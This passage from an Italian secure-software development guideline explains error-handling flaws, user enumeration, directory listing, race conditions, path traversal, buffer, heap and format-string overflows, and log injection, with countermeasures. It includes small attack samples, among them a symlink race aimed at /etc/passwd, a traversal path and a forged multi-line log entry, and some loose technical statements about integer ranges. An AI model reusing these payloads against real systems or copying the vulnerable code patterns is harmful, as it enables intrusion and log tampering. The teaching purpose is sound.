frequentemente trascurati dagli sviluppatori di sof tware. La non corretta implementazione delle eccezi oni 
può indurre l’applicazione a: 
• bloccarsi o sospendersi; 
• rilasciare informazioni utili all’aggressore per av anzare con successo nella sua azione intrusiva nel 
sistema; 
• permettere all’aggressore di acquisire il controllo  diretto del sistema o dell’applicazione. 
 
Esempio:  
Se l’applicazione non gestisce bene l’errore, le in dicazioni che possono essere mostrate possono forni re 
molte informazioni all’attaccante, sia sull’applica zione, sia sull’ambiente nel quale gira. Ad esempio  si 
guardi il seguente stack overflow  mostrato in chiaro sulla pagina web, in seguito a un errore 
dell’applicazione: 
 
Exception sending context initialized event to list ener instance of class 
com.selexes.gcm.server.MyServletContextListener jav a.lang.ArithmeticException: / 
by zero at  
com.selexes.gcm.server.MyAppServerBase.<init>(MyApp ServerBase.java:46)at 
com.insecurefirm.MyApp.server.MyAppServerXmpp.<init >(MyAppServerXmpp.java:33) at 
com.insecurefirm.MyApp.server.MyAppServerXmpp.getIn stance(MyAppServerXmpp.java:77) 
at 
com.insecurefirm.MyApp.server.MyAppServerFactory.<i nit>(MyAppServerFactory.java:76 
)at 
com.insecurefirm.MyApp.server.MyAppServerFactory.ge tInstance(MyAppServerFactory.ja 
va:27)at 
com.insecurefirm.MyApp.server.MyServletContextListe ner.contextInitialized(MyServle 
tContextListener.java:34)at 
org.apache.catalina.core.StandardContext.listenerSt art(StandardContext.java:4812)a 
t 
org.apache.catalina.core.StandardContext.startInter nal(StandardContext.java:5255)a 
t org.apache.catalina.util.LifecycleBase.start(Life cycleBase.java:147)at 
org.apache.catalina.core.ContainerBase$StartChild.c all(ContainerBase.java:1408)at 
org.apache.catalina.core.ContainerBase$StartChild.c all(ContainerBase.java:1398)at  
java.util.concurrent.FutureTask.run(Unknown Source) at 
 
 
Linee guida per lo sviluppo sicuro Pag. 36  a 156  
 
java.util.concurrent.ThreadPoolExecutor.runWorker(U nknown Source)at  
java.util.concurrent.ThreadPoolExecutor$Worker.run( Unknown Source) 
java.lang.Thread.run(Unknown Source) 
One or more listeners failed to start. Full details  will be found in the 
appropriate container log file 
 
Di seguito vengono trattate le tecniche più comuni che possono causare l’insorgere delle problematiche  
descritte nei punti precedenti. 
6.4.1  User Enumeration 
Consiste nel tentativo, da parte di un attaccante, di indovinare, attraverso un attacco di brute force , 
l’esistenza di determinate utenze. Questa vulnerabi lità è presente su quei servizi o quelle applicazio ni che 
non gestiscono opportunamente le condizioni di erro re durante le fasi di login e/o interrogazione, 
ritornando messaggi specifici e non generici. Gli a ttacchi di user enumeration colpiscono prevalenteme nte i 
portali web, seppur l’ambito di sfruttamento non si a unicamente circoscrivibile a questo genere di 
ambienti. Le applicazioni o i servizi soggetti a ta le problematica vengono stressati da un aggressore con 
apposite richieste. In base alle risposte ottenute,  l’aggressore è in grado di determinare quali siano  le 
utenze valide e quali quelle inesistenti nel sistem a/portale. La possibilità di determinare gli utenti  regolari, 
gli permetterà di utilizzare le informazioni acquis iste come base di partenza per attacchi intrusivi p iù precisi 
e mirati. Ad esempio, se a seguito di un processo d i autenticazione, in risposta alla sua richiesta di  login, 
ottiene il messaggio specifico “Nome Utente Errato” , ne conclude che l’utenza utilizzata non esiste; 
viceversa, se la risposta ritornata è “Password Err ata” viene provata invece la sua esistenza. Condizi oni 
simili possono essere riscontrate non solo nei proc essi di autenticazione, ma anche di registrazione d i un 
nuovo utente, di recupero password o in applicazion i server per lo scambio di posta elettronica. 
 
Esempio:  
Risultato di una procedura di user enumeration su u n modulo di login: 
 
 
Contromisure 
In nessun caso di errore, l’applicazione deve mostr are pagine di dettaglio dell’errore. L’utente deve essere 
rinviato su una pagina generica che mostra le infor maizoni minime. 
I messaggi d’errore devono essere il più generico p ossibile, per non dare ad un eventuale attaccante 
informazioni preziose che ne facilitino l’opera. Ne l caso mostrato, il messaggio potrebbe essere: 
“Attenzione! Lo username o la password inseriti non  risultano essere corretti”. Per gli utenti con pro filo 
Amministratore non deve essere consentito l’utilizz o di user name intuitivi quali “Admin”, “Administra tor”, 
“Superuser” e simili. 
6.4.2  Information disclosure 
Le problematiche d’information disclosure sono molt o comuni nelle applicazioni Web anche se non 
unicamente circoscrivibili a questo ambito. Si mani festano quando un aggressore riesce con apposite 
richieste a sollecitare una condizione non prevista  o mal gestita dall’applicazione che ritorna messag gi 

 
 
Linee guida per lo sviluppo sicuro Pag. 37  a 156  
 
informativi o di errore contenenti dati o informazi oni che possono agevolarlo nella pianificazione di nuovi 
attacchi intrusivi. Non tutte le condizioni d’infor mation disclosure sono causate da richieste o event i non 
correttamente gestiti dall’applicazione. Alla radic e di problematiche simili possono anche esservi scr ipt o 
componenti mal progettati che, interrogati opportun amente con richieste regolari, possono fornire 
all’aggressore spunti utili per proseguire nella su a attività intrusiva. Sono classificabili come deri vanti da 
problematiche d’information disclosure le seguenti informazioni rilasciate dall’applicazione ad utenze  
anonime o non autorizzate, a seguito di richieste m alevole o regolari: 
• I dati che svelano il percorso o i percorsi su disc o in cui gli script o le componenti dell’applicazio ne 
sono stati installati e risiedono; 
• I dati correlabili allo stato attuale dell’applicaz ione, alla sua versione e agli eventuali moduli o p lug-
in installati; 
• I dati correlabili ai log delle attività manutentiv e svolte sull’applicazione; 
• Tutti gli altri dati eventualmente svelati che per l’organizzazione hanno valenza critica, personale o  
sensibile; 
• etc. 
Le applicazioni compilate con l’opzione debugging o  verbose possono essere più facilmente soggette a 
problematiche di information disclosure. Molte di q ueste condizioni si verificano inoltre a causa di u na poco 
accorta gestione dell’input utente (vedasi ‘ Valida zione dell'input’ e relativi sottoparagrafi). 
 
Esempio di default script web soggetto a informatio n disclosure: 
 
 

 
 
Linee guida per lo sviluppo sicuro Pag. 38  a 156  
 
 
L’esempio di cui sopra mostra come l’applicazione ( a seguito di condizioni mal gestite) fornisce messa ggi 
informativi o di errore contenenti dati o informazi oni (server type –nginx-, versione ed il S.O. -Ubun tu-) che 
possono agevolare l’aggressore. 
Contromisure 
Per evitare di divulgare importanti informazioni, u tilizzabili da eventuali attaccanti, è necessario c onfigurare 
l’application server in modo tale che, nelle intest azioni http di risposta non vengano fornite informa zioni 
quali ad esempio: server type (in questo caso ngix ), nome e/o release del sistema operativo.  
Per tale finalità, prima di sviluppare l’applicazio ne è fondamentale analizzare le possibili minacce ( threat 
modeling). L’analisi consente di individuare in man iera più puntuale gli elementi a rischio, che potre bbero 
portare alla divulgazione d’informazioni utili ad u n eventuale attaccante. 
6.4.3  Directory Listing 
Le problematiche di directory listing sono molto co muni nelle applicazioni Web, anche se non unicament e 
circoscrivibili a quest’ambito. Si manifestano quan do un aggressore riesce con apposite richieste a 
visualizzare il contenuto di una directory, preleva ndo file dal suo interno o visualizzando dati che 
dovrebbero di norma essere preclusi agli utenti non  autenticati o che non dispongono di specifici priv ilegi. 
Comunemente un aggressore riesce a sfruttare questo  tipo di problematiche facendo leva su configurazio ni 
applicative errate. 
Esempio di una sessione Directory Listing: 
 
 
Contromisure 
I web sever prevedono l’opzione di abilitare/disabi litare il directory listing. Occorre fare attenzion e che il 
default non sia l’abilitazione, nel qual caso impos tare la disabilitazione. 
6.4.4  Denial of Service (DoS) 
Traduzione di “negazione del servizio”, un denial o f service è una condizione che causa, a seconda di 
specifiche circostanze, il blocco, la sospensione o  il rallentamento dell’applicazione, di un suo sing olo 
processo, di un’unica componente o dell’intero sist ema. Ciò è determinato dal tipo di integrazione 
dell’applicazione stessa con il kernel, le sue stru tture e dai privilegi con i quali viene eseguita. U na 

 
 
Linee guida per lo sviluppo sicuro Pag. 39  a 156  
 
condizione di denial of service viene comunemente c ausata da un aggressore che sfrutta errori di 
programmazione riconducibili a problematiche di ove rflow (descritte nel paragrafo 4.2.6) o come effett o di 
un attacco non andato a buon fine, che mirava origi nariamente all’esecuzione di uno shellcode. 
Condizioni di denial of service meno pesanti posson o ad esempio causare il blocco di un account utente . 
Deadlock  - Nella programmazione multithread, uno degli erro ri che più comunemente da origine a 
problematiche di Denial Of Service è il deadlock. È  una circostanza che si verifica quando due o più p rocessi 
si fermano ad aspettarsi l’un l’altro, a tempo inde finito. La condizione che sbloccherebbe l’attesa, c he 
potrebbe essere il termine di esecuzione di una pro cedura o il liberamento di una risorsa che causa il  
blocco, non si verifica mai. 
 
Esempio di crash di un’applicazione che presenta un a problematica di Stack Overflow: 
 
 
L’attacco è andato a buon fine pertanto l’applicazi one necessita di essere riavviata per fornire nuova mente 
il servizio  agli utenti. 
Contromisure 
Dato che il denial of service può essere causato da  numerose condizioni inerenti l’applicazione o l’am biente 
operativo, le contromisure comprendono una serie di  best practises di programmazione che limitino al 
minimo la superficie d’attacco. 
A livello di web server è possibile: definire il nu mero massimo di richieste accettabili per una conne ssione 
TCP; stabilire un timeout e la dimensione massima d el body di una singola richiesta; definire un timeo ut per 
ogni connessione. 
6.4.5  Race condition 
La race condition, dove “race “ sta per “corsa” è u na situazione che si verifica in un ambiente 
multithreading, dove più processi entrano in compet izione per le stesse risorse. Ciò è possibile quand o è 
importante la sequenza delle operazioni, ma l’acces so alle risorse da parte dei vari thread non è sogg etto 
ad alcun vincolo. 
La circostanza più classica è riconducibile a quell e applicazioni che devono scrivere dei dati sul dis co dopo 
aver effettuato una serie di controlli preventivi. Un aggressore può usufruire del lasso di tempo in c ui questi 
controlli vengono effettuati, o bloccare per un suf ficiente periodo la loro esecuzione, sfruttando una  
vulnerabilità logica dell‘applicazione (ad esempio un deadlock momentaneo), per alterare il dato di 
destinazione.  
Le conseguenze di una modifica malevola del dato po ssono variare da un errore logico o applicativo, fi no al 
crash dell’applicazione, o addirittura del sistema,  se si riesce a generare un errore di overflow. 
 
Esempio:  
Il frammento di codice che segue; verifica l’access o a un determinato file e nel caso in cui l’esito d ella 
verifica sia ‘truè, apre il file in scrittura: 
if (access("file", W_OK) != 0) { 
  exit(1); 
} 
fd = open("file", O_WRONLY); 
// Actually writing over /etc/passwd 
write(fd, buffer, sizeof(buffer)); 
Se fra il controllo e l’apertura del file, l’attacc ante riesce a creare un link simbolico a “file” att raverso la 
seguente sequenza di codice:  
symlink("/etc/passwd", "file"); 

 
 
Linee guida per lo sviluppo sicuro Pag. 40  a 156  
 
l’attaccante riesce a manomettere il comportamento del programma che andrà quindi a scrivere nel file 
sbagliato.  
Contromisure 
La gestione della concorrenza fra diversi processi all’interno della stessa applicazione è una questio ne 
piuttosto delicata. Massima cura deve essere presta ta, in fase di progettazione, al problema della 
competizione fra diversi thread per le stesse risor se. Non c’è una regola universale, ma i vari lingua ggi di 
programmazione offrono diversi strumenti per la ges tione di questo specifico aspetto. 
La sincronizzazione di metodi e classi o l’uso di s emafori sono di solito i rimedi adottati per preven ire 
questo problema. 
6.4.6  Privilege Escalation e aggiramento dei permessi ute nte 
Le eccezioni e le condizioni non previste o mal ges tite sono sfruttate molto spesso dagli aggressori p er 
ottenere un innalzamento dei privilegi (privilege e scalation), ovvero la possibilità di svolgere opera zioni sul 
sistema o sulla stessa applicazione con privilegi s uperiori rispetto a quelli posseduti prima dell’att acco. Ad 
esempio, sfruttando con successo uno Stack Overflow , l’aggressore che da remoto poteva unicamente 
godere dei privilegi di un utente anonimo o di bass o profilo, può successivamente operare nel sistema 
come se fosse un utente locale a cui sono stati ass egnati permessi amministrativi. Analogamente sfrutt ando 
una situazione di race condition, l’aggressore può modificare un file pur non possedendo come utenza 
originaria gli effettivi privilegi di scrittura. Ne l caso di un Directory Listing può invece accedere ad aree 
riservate di un portale ancor prima di autenticarsi , bypassando il meccanismo con il quale l’applicazi one 
assegna i permessi agli utenti regolari. 
Le motivazioni che rendono solitamente possibile un  Privilege Escalation sono menzionate di seguito: 
• l’applicazione, il servizio o il singolo componente  vengono avviati con i privilegi amministrativi; 
• L’applicazione utilizza privilegi amministrativi an che quando svolge azioni per conto di un’utenza 
non privilegiata; 
• Nei sistemi Unix o derivati il bit Set-User-ID è at tivo. 
 
Una privilege escalation non si definisce tale solo  quando l’innalzamento dei privilegi riguarda diret tamente 
il passaggio da un’utenza non privilegiata a una pr ivilegiata, ma anche quando lo scambio di permessi 
avviene tra utenze non privilegiate. 
 
Esempio:  
Attraverso la tecnica del path traversal, l’attacca nte è in grado di individuare le pagine che consent ono 
l’accesso senza autenticazione: 
 
 /../.././userProfiles.html 
 
Contromisure 
È necessario progettare l’applicazione in modo tale  da impedire che informazioni utili all’attacco pos sano 
essere svelate in caso di errore o di un’eventualit à non gestita.   
6.5  Bound checking e problematiche di overflow 
Le problematiche di Overflow si verificano solitame nte quando i dati provenienti da input utente, senz a 
prima essere adeguatamente verificati, vengono memo rizzati all’interno di buffer non abbastanza grandi  
per contenerli. Ciò è all’origine di differenti con seguenze, a seconda delle regioni di memoria in cui  
l’overflow si è manifestato e delle aree sovrascrit te. In alcuni casi, l’aggressore può sfruttare l’ar ea di 
memoria sovrascritta per eseguire comandi remoti fi nalizzati all’apertura di un canale di accesso al s istema 
vulnerabile. Altre volte viene semplicemente genera to un crash dell’applicazione o del sistema, con 
conseguente interruzione nell’erogazione del serviz io (DoS).  
 
 
Linee guida per lo sviluppo sicuro Pag. 41  a 156  
 
Altri problemi di overflow si manifestano a seguito  di circostanze diverse e non necessariamente corre labili 
alla copia o allo spostamento di dati in un buffer insufficiente. Le principali problematiche di overf low oggi 
conosciute vengono di seguito descritte. 
6.5.1  Stack overflow 
Il principio di sfruttamento è molto semplice e si basa sulla possibilità di saturare un buffer oltre le sue reali 
capacità di contenimento, fino a sovrascrivere l’in dirizzo di ritorno della funzione vulnerabile. L’in dirizzo di 
ritorno è un valore posizionato nella regione di me moria stack che permette all’applicazione, al rient ro 
della funzione chiamata, di riprendere l’esecuzione  dall’istruzione immediatamente successiva. Questo 
valore è puntato da diversi registri, in base all’a rchitettura hardware per la quale l’applicazione è stata 
compilata (ad esempio EIP su piattaforma x86 o RIP su piattaforma x64). Riuscendo a saturare un buffer  
oltre le sue capacità di contenimento, un aggressor e ha la possibilità di sovrascrivere, con valori 
prettamente arbitrari, tutte le aree di memoria adi acenti, fino a giungere all’indirizzo di ritorno, f acendo 
proseguire l’esecuzione del programma da qualsiasi indirizzo di memoria desiderato, deviando il regola re 
flusso esecutivo dell’applicazione. 
L’esecuzione di codice malevolo attraverso uno stac k overflow si sostanzia fondamentalmente in tre ste p: 
• l’aggressore satura il buffer non soggetto a bound- checking e colloca ad un certo punto della 
memoria lo shellcode; 
• l’aggressore sovrascrive l’indirizzo di ritorno del la funzione vulnerabile con l’indirizzo in memoria in 
cui risiede lo shellcode; 
• Dal ritorno della funzione lo shellcode viene esegu ito; 
 
Esempio:  
Rappresentazione generica di uno stack overflow: 
 
Contromisure 
Il programmatore deve configurare i cicli sugli arr ay in modo da non superare il numero di elementi 
previsto. Un loop per tutta la lunghezza possibile  del buffer potrebbe attivare il codice malevolo. 
6.5.2  Off-by-one/Off-by-few 
Gli overflow che si manifestano nello stack sono og gi meno frequenti rispetto al passato, ma non sono del 
tutto scomparsi. In realtà, queste problematiche so no ancora riscontrabili nei moderni software, a cau sa di 
errate pratiche di programmazione. Gli overflow def initi Off-by-one o Off-by-few ne sono la dimostrazi one 
palese. Rientrano in questa categoria tutti gli ove rflow che, al contrario degli stack overflow, perme ttono di 
eccedere solo di uno o pochi byte oltre le reali ca pacità di contenimento di un buffer. Questa condizi one, a 
seconda del  compilatore utilizzato, della predispo sizione dei buffer e delle variabili in memoria e q uindi 
soprattutto dell’architettura hardware su cui il so ftware gira, può permettere ad un aggressore di alt erare a 

 
 
Linee guida per lo sviluppo sicuro Pag. 42  a 156  
 
piacimento il flusso di esecuzione dell’applicazion e, senza intaccare in modo diretto l’indirizzo di r itorno 
della funzione vulnerabile. In genere è sufficiente  raggiungere l’ultimo byte dell’indirizzo dello sta ck frame 
della funzione vulnerabile (il frame pointer puntat o ad esempio nell’architettura hardware x86 dal reg istro 
EBP) per sfruttare l’attacco eseguendo uno shellcod e. Questo genere di errori si verifica molto spesso  
all’interno di cicli. 
 
Esempio:  
Esempio corretto di riempimento di un buffer 
 
In una situazione normale la variabile buffer[104] dovrebbe contenere 103 byte di dati seguiti dal 
terminatore stringa NULL (‘\0’)  
 
Esempio errato di buffer sovrascritto di pochi byte  oltre le sue reali capacità di contenimento 
 
Contromisure 
Gli sviluppatori devono porre la massima attenzione  sui loop all’interno degli array, rispettando la 
lunghezza allocata. I null di terminazione stringa devono essere conteggiati e considerati. 
6.5.3  Format string overflow 
Il Format string overflow è una tecnica abbastanza recente, descritta nella sua capacità di eseguire 
istruzioni remote su un sistema durante la prima me tà del 2000. Precedentemente nota per i soli effett i di 
blocco di un’applicazione, questo genere di overflo w si può manifestare nelle regioni di memoria stack  o 
heap. Si verifica quando non viene specificato deli beratamente il formato di funzioni che lavorano le 
stringhe (ad esempio printf, fprintf, sprintf, snpr intf), costruendo tale formato a partire dall’input  utente.  
Tramite il format string “%n”, un aggressore può, i nfatti, scrivere un valore arbitrario in un qualsia si punto 
dello spazio di memoria allocato per il processo de ll’applicazione. 
L’esecuzione di codice malevolo attraverso un forma t string overflow si sostanzia fondamentalmente in tre 
step: 
• L’aggressore colloca in un certo punto in memoria l o shellcode; 
• L’aggressore individua in memoria l’indirizzo di ri torno della funzione vulnerabile e lo sovrascrive 
con l’indirizzo in cui risiede lo shellcode; 
• Al ritorno dalla funzione lo shellcode viene esegui to. 
Questa tecnica è soggetta a variazioni nel caso di buffer che risiedono nella regione di memoria heap,  dove 
per eseguire lo shellcode è eventualmente possibile  sfruttare indirizzi di chiamata a funzioni di hook , 
puntatori a funzioni di distruzione (Destructor) in vocate all’uscita dell’applicazione, puntatori a ge stori delle 
eccezioni o puntatori a funzioni residenti in libre rie esterne linkate con l’applicazione. Un aggresso re può 
utilizzare uno di questi puntatori anche nel caso i n cui l’overflow si manifesta nella regione di memo ria 
stack (ad esempio per bypassare restrizioni di tipo  stack canary/cookie o in quelle architetture in cu i lo 
stack non risulti essere eseguibile). 
Esempio 
Se l’applicazione accetta parametri di sostituzione  come %x  e %s  in istruzioni come la printf :  
 
printf(“valore immesso: %s”, valoreInput); 
  
      1      2     3     4     5     6     7      8      9    10    11                        98   99  100 101 102  103          
 
 NULL byte 
 
              ……… 
 
      1     2     3     4      5      6     7      8     9    10   11                         98  99   100 101  102 103 104  105 
……… … 
 
 
Linee guida per lo sviluppo sicuro Pag. 43  a 156  
 
L’attaccante sostituendo il valore del campo in inp ut (valoreInput ) con %x farà perdere all’applicazione 
il riferimento corretto: l’applicazione cercherà il valore corrispondente nel la memoria stack senza riuscire a 
trovarlo. A questo punto l’attacco ha conseguenze a ncora più gravi se all’indirizzo di memoria di quel la 
variabile, l’attaccante fa corrispondere una funzio ne inserita ad hoc dallo stesso. 
Contromisure 
Non utilizzare mai l’input dell’utente come stringa  di formattazione per le funzioni tipo printf e sca nf senza 
averlo prima verificato. 
6.5.4  Heap overflow 
I buffer allocati dinamicamente da un’applicazione risiedono nella regione di memoria heap e sono 
sottoposti a problematiche di overflow così come qu elli residenti nello stack. Un luogo comune del pas sato 
oramai sfatato era che problematiche di questo tipo  non potessero essere sfruttate da un aggressore pe r 
eseguire uno shellcode per via dell’assenza di un i ndirizzo di ritorno che potesse essere utilizzato c ome 
puntatore al codice malevolo. Un heap overflow si m anifesta solitamente quando un buffer che viene 
deallocato contiene dati arbitrari provenienti da i nput utente o quando successivamente ad un overflow  ne 
viene allocato uno nuovo. In entrambi i casi, secon do l’architettura, si viene a creare una condizione  adatta 
per l’esecuzione fraudolenta di uno shellcode. La t ecnica è resa possibile manipolando i puntatori all e aree 
di memoria (chunk) che vengono liberati/allocati.  
Presi tre elementi (A, B e C) appartenenti a una li sta circolare, per liberare la memoria di B, A dovr à 
riconoscere C come elemento successivo e C dovrà ri conoscere A come elemento precedente: 
 
 
 
Quando l’applicazione deve allocare un nuovo buffer  dinamico, l’Heap Manager osserva questa lista per 
determinare quale è il prossimo chunk utilizzabile ed aggiorna opportunamente i puntatori. Quando 
l’applicazione deve liberare un buffer dinamico, l’ Heap Manager aggiorna allo stesso modo i puntatori per 
tenere traccia dei chunk inutilizzati. Gli indirizz i di memoria indirizzati da tali puntatori vengono mantenuti 
all’interno di strutture apposite (header) antepost e a ciascun chunk. Con il manifestarsi di un Heap 
Overflow, l’header del chunk adiacente può essere a rtificiosamente modificato dall’aggressore che, 
manipolando a piacimento i puntatori della struttur a, può scrivere un qualsiasi valore all’interno di 
qualunque indirizzo residente nello spazio di memor ia del processo in esecuzione. 
L’esecuzione di codice malevolo attraverso un Heap Overflow si sostanzia fondamentalmente in quattro 
step: 
• L’aggressore colloca in un certo punto in memoria l o shellcode e sovrascrive opportunamente il 
buffer residente nell’Heap; 
• L’aggressore sollecita o attende che l’area di memo ria sovrascritta venga liberata dall’applicazione 
o ne venga sequenzialmente allocata una nuova; 
• A seguito di uno degli eventi descritti nel punto p recedente, l’indirizzo dello shellcode viene 
collocato in un punto in memoria arbitrariamente sc elto dall’aggressore tramite la manipolazione 
dei puntatori memorizzati nella struttura che descr ive il chunk liberato/allocato. Punti validi sono 
ad esempio gli indirizzi di chiamata a funzioni di hook o i puntatori a gestori delle eccezioni; 
Lo shellcode viene eseguito. 
 

 
 
Linee guida per lo sviluppo sicuro Pag. 44  a 156  
 
Sovrascrivere un puntatore a file  - Non tutti gli overflow che si manifestano nella regione di memoria heap 
possono essere sfruttati per eseguire uno shellcode  sul sistema. Ad esempio, quando un heap overflow s i 
manifesta in memoria, in prossimità di un puntatore  a un file, l’aggressore può alterarlo e sollecitar e la 
scrittura di dati arbitrari in un punto diverso del  disco.  
In questo modo, un aggressore potrebbe aggiungere a l sistema un nuovo utente con password nulla, 
cambiare da remoto la configurazione di un’applicaz ione, disattivando alcune sue funzionalità di sicur ezza o 
aggiungendovi direttive originariamente non previst e. Un esempio schematico è rappresentato nelle figu re 
che seguono: 
 
 
 
 
Esempio:  
Le seguenti istruzioni causano un heap overflow: 
int main(int argc, char **argv) { 
    char *p, *q; 
 
    p = malloc(1024); 
    q = malloc(1024); 
    if (argc >= 2) 
        strcpy(p, argv[1]); 
    free(q); 
    free(p); 
    return 0; 
} 
Se argv[1]  supera, in lunghezza, il buffer dichiarato; viene “scritto” l’indirizzo non mappato dell’heap 
memory (relativamente ai dati). 
Contromisure 
Controllare e verificare sempre l’input utente. La lunghezza del buffer accettato non deve superare la  
lunghezza dell’area di memoria destinato a contener lo. 
Originariamente il file puntato è : 
/tmp/temp.tmp 
A seguito dell’overflow il file 
puntato è: /etc/passwd 
 
 
Linee guida per lo sviluppo sicuro Pag. 45  a 156  
 
6.5.5  Integer overflow ed altri errori logici di programm azione 
Inizialmente con il termine integer overflow si ten deva a descrivere una moltitudine di vulnerabilità 
differenti tra loro. Solo nel 2002 questo tipo di p roblematica è stata circoscritta a una specifica co ndizione 
che si verifica quando un’applicazione effettua un’ operazione matematica di addizione, sottrazione o 
moltiplicazione su un intero con segno, acquisendo un operando da input utente e non considerando i ca si 
in cui il valore numerico ottenuto può essere negat ivo o minore/maggiore del previsto. Nel caso in cui  
l’aggressore ha la possibilità di specificare un va lore arbitrario, può causare uno stack o un heap ov erflow  
secondario, quando il risultato dell’operazione mat ematica viene utilizzato per specificare la dimensi one di 
un buffer, forzandone un’allocazione non sufficient e a contenere i dati acquisiti in ingresso dalla fu nzione 
vulnerabile. 
Una problematica simile si verifica anche nei casi in cui un valore numerico acquisito da input utente  viene 
convertito in un formato differente rispetto alla v ariabile originaria che lo contiene. Secondo il tip o di 
conversione, il risultato finale può differire note volmente in eccesso o in difetto dal valore inizial e, 
causando l’allocazione di buffer insufficienti a so ddisfare la necessità di contenimento dei dati o lo  
spostamento/la copia di un numero di byte eccessivo  da un’area di memoria all’altra. 
Un terzo fattore di instabilità in un’applicazione può derivare dalla asseganzione di valori non tenen do nella 
gisuta considerazione il fatto che una variabile nu merica sia signed o unsigned. 
 
Esempio:  
Nel seguente codice un numero troppo grande causa u n overflow della memoria: 
char variabileChar = ‘0’; 
int valoreIntero = 1000; 
variabileChar = valoreIntero; 
variabileChar , dichiarato come char , può contentere: un valore da -128 a +127, se sign ed; un valore da 0 
a 256, se unsigned. L’attribuzione del valore 1000 causerà un buffer overflow. 
Nel seguente esempio, un valore accettabile in un c har dichiarato unsigned, causa overflow se il char è 
dichiarato signed: 
signed char variabileChar = ‘0’; 
int valoreIntero = 200; 
variabileChar = valoreIntero; 
Contromisure 
• Controllare l’input dell’utente è indispensabile pe r verificare la congruità dei dati prima di 
accettarli. 
• L’adozione delle Best practises di programmazione r iduce gli errori e quindi l’insorgenza del buffer 
overflow. 
6.6  Processi di tracciamento 
Il tracciamento delle operazioni svolte dagli utent i è una delle attività più critiche per un’applicaz ione, 
poichè l’implementazione di un meccanismo di loggin g inadatto o insufficiente permette ad un aggressor e 
di mascherare le sue operazioni, di sospendere il s ervizio o in taluni casi di eseguire comandi remoti  sul 
sistema che ospita l’applicazione vulnerabile. 
Di seguito sono riportate alcune categorie di error i che agevolano l’aggressore in operazioni che port ano a 
sospendere il servizio di tracciamento dell’applica zione o in talune circostanze di eseguire codice da  
remoto. 
6.6.1  Agevolazione delle attività malevole dell’aggressor e 
Una delle principali preoccupazioni di un aggressor e che sferra o porta a termine un attacco a fini in trusivi è 
di rimuovere ogni traccia delle sue attività, per n on essere chiaramente identificato. Qualora abbia l a 
possibilità di manomettere il meccanismo di log, il   tracciamento non fornirà all’amministratore alcun a 
 
 
Linee guida per lo sviluppo sicuro Pag. 46  a 156  
 
evidenza dell’attacco al sistema o al servizio e di  conseguenza, non potrà implementare alcuna misura di 
contrasto. 
Le cause più comunemente riconducibili a questa pro blematica derivano da: 
• errori nella progettazione del meccanismo di tracci amento dell’applicazione. Specifiche attività 
svolte dagli utenti non vengono registrate e  vengo no memorizzate su file di log solo alcune delle 
operazioni effettuate (ad esempio viene tracciata l ’autenticazione di un’utenza, ma non la modifica 
di una particolare risorsa); 
• presenza di informazioni di natura critica (ad esem pio password di accesso dell’applicazione non 
cifrate) registrate all’interno dei file di log, co ngiuntamente a problematiche di Directory Listing o  di 
Directory Traversal. 
Contromisure 
La web application deve produrre  un log di tipo ap plicativo che riporti puntualmente le operazioni di  login 
e di logout degli utenti, nonché tutte le operazion i rilevanti che essi hanno effettuato (ad esempio l ’update 
di un record sulla base dati). I file di log devono  essere accessibili in sola lettura e solo ai gesto ri 
dell’applicazione e agli addetti all’auditing. 
6.6.2  Oscuramento delle attività dell’aggressore 
Come descritto in precedenza, tra le principali pre occupazioni di un aggressore vi è quella di oscurar e tutte 
le sue attività compromettenti o i suoi tentativi d ’intrusione. Il metodo più diretto per farlo è otte nere 
accesso remoto al sistema e quindi rimuovere manual mente le tracce lasciate nei file di log. In altri casi è 
possibile manomettere direttamente il meccanismo di  tracciamento dell’applicazione. Il filtraggio erro neo 
di caratteri di controllo (“\r”, “\n” o “\t”) può, infatti, determinare la registrazione parziale sui file di log 
delle attività o dei dati di provenienza dell’aggre ssore (indirizzo IP, utenza utilizzata per condurre  la frode, 
tipo di operazione svolta, ecc.), nonché l’inserime nto di righe fraudolente. Si parla di log injection  o di CRLF 
injection. 
 
Esempio:  
Attacchi di log injection possono alterare il conte nuto dei file di tracciamento, rendendo difficoltos a l’analisi 
dei tentativi di intrusione. Nel seguente codice: 
if  (loginSuccessful) {  
   logger.severe("User login succeeded for: "  + username);  
} else  { 
   logger.severe("User login failed for: "  + username);  
} 
Introducendo una stringa multilinea come la seguent e: 
guest  
June 15, 2017 2:30:52 PM java.util.logging.LogManag er$RootLogger log 
SEVERE: User login succeeded for: administrator  
Il log mostrerebbe qualcosa come: 
June 15, 2017 2:25:10 PM java.util.logging.LogManag er$RootLogger log 
SEVERE: User login failed for: guest 
June 15, 2017 2:30:52 PM java.util.logging.LogManag er log 
SEVERE: User login succeeded for: administrator 
Il testo così registrato falsa i dati reali. 
Contromisure 
Anche in questo caso, l’utilizzo di librerie standa rd per la creazione dei file di log comporta la mit igazione 
del rischio di tampering. I file di log devono esse re accessibili in sola lettura e solo da parte del personale 
autorizzato (generalmente chi gestisce l’applicazio ne). 
Anche in questo caso, occorre bonificare l’input pr ima di utilizzarlo anche nella scrittura dei file d i log. 
I caratteri CR (Carriage Return) e LF (Line Feed) d evono essere rilevati e filtrati, e la riga che li contiene deve 
essere segnalata.  
 
 
Linee guida per lo sviluppo sicuro Pag. 47  a 156  
 
7 BEST PRACTICES PER LO SVILUPPO IN SICUREZZA  
Molti dei problemi di sicurezza del software sono d a attribuire alla scarsa conoscenza, da parte degli  
sviluppatori, delle principali vulnerabilità e dei possibili attacchi che potrebbero sfruttarle.  
 Il presente capitolo fornisce una vista delle prin cipali vulnerabilità e delle relative contromisure,  
contestualizzate per ogni specifica area di svilupp o (C/C++, Java, PL/SQL, etc), anche in termini di t ecniche 
da utilizzare per riconoscerle e difendersi opportu namente.  
7.1  C/C++  
Il linguaggio di programmazione procedurale denomin ato C fu sviluppato da Dennis Ritchie tra il 1969 e  il 
1973 presso i Bell Labs, con lo scopo di implementa re parti di sistema operativo Unix. Da allora è div entato 
uno dei linguaggi di programmazione più diffusi e u tilizzati, grazie alla sua grande potenza e flessib ilità. Il 
linguaggio C, infatti, consente al programmatore di  accedere alla memoria della macchina in maniera 
diretta, in modo da indirizzare e sfruttare qualsia si risorsa, software e hardware. 
 
Dal C deriva il linguaggio di programmazione C++ (o  CPP acronimo di “C plus plus”) , orientato agli og getti, 
con tipizzazione statica. È stato sviluppato (in or igine col nome di "C con classi") da Bjarne Stroust rup, 
sempre presso ai Bell Labs nel 1983 nell’ottica del la modernizzazione del linguaggio C.  
 
Poiché i linguaggi C e C++ hanno caratteristiche mo lto simili, ai fini della sicurezza del codice le v ulnerabilità 
e le relative contromisure sono da considerarsi val ide per entrambi i linguaggi. 
